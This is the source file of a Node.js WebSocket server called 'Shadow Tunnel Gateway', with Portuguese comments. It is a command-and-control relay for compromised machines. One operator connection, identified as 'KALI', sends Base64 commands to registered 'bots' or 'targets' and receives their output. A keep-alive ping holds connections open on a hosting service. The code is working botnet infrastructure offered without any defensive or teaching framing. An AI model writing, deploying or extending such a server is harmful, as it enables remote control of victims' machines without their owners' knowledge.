const WebSocket = require('ws');
const http = require('http');

const server = http.createServer((_, r) => r.end('Shadow Tunnel Gateway Active'));
const wss = new WebSocket.Server({ server });

let KALI = null;
const BOTS = new Map();

wss.on('connection', (ws, req) => {
    const id = new URLSearchParams(req.url.split('?')[1]).get('id');
    if (!id) return ws.close();

    if (id === 'KALI') {
        KALI = ws;
        console.log('[+] Controlador Kali Conectado');
        BOTS.forEach((_, botId) => {
            KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: botId }));
        });
    } else {
        BOTS.set(id, ws);
        console.log(`[+] Novo Alvo: ${id}`);
        if (KALI && KALI.readyState === WebSocket.OPEN) {
            KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: id }));
        }
    }

    ws.on('message', (raw) => {
        if (ws === KALI) {
            try {
                const data = JSON.parse(raw);
                const target = BOTS.get(data.to);
                if (target && target.readyState === WebSocket.OPEN) {
                    target.send(data.cmd); // Envia o Base64 puro para o alvo
                }
            } catch (e) { console.log("Erro no comando do Kali"); }
        } else {
            // Resposta do Bot -> Encaminha para o Kali
            if (KALI && KALI.readyState === WebSocket.OPEN) {
                KALI.send(JSON.stringify({ t: 'res', f: id, d: raw.toString() }));
            }
        }
    });

    ws.on('close', () => {
        if (ws === KALI) {
            KALI = null;
        } else {
            BOTS.delete(id);
            if (KALI && KALI.readyState === WebSocket.OPEN) {
                KALI.send(JSON.stringify({ t: 'bot', s: 'off', id: id }));
            }
        }
    });
    
    // Keep-alive para evitar que o Render derrube a conexão por inatividade
    const ping = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) ws.ping();
        else clearInterval(ping);
    }, 25000);
});

server.listen(process.env.PORT || 10000);
